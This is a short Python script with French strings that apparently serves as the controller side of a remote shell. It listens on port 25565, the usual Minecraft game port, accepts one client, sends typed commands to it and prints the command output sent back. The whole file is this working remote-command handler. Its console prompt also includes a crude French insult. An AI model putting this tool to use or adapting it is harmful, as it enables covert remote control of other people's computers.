import socket, os
hote = ''
port = 25565
boucle = True
clearconsole = "cls"
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind((hote, port))
socket.listen(1)
print("Attente de connection")

client, infos_connexion = socket.accept()
os.system(clearconsole)
print("Connecté à : ",infos_connexion)
print("\nRemote Terminal [Version 1]\n(c) 2019 Coni. J ai mis aucun droit lol.\n")

while boucle is True:
    whereiam = client.recv(1024).decode()
    commande = input(whereiam+"salepute")

    if commande == "closeserverclient":
        boucle = False
    elif commande == clearconsole:
        os.system(clearconsole)
    elif commande == "":
        commande = " "
    elif commande == "infoconnect":
        print(infos_connexion)
        commande = " "
    commande = commande.encode()
    client.send(commande)
    reponse = str( client.recv(9999).decode("utf-8", errors="ignore"))
    print(reponse)
        

client.close()
socket.close()
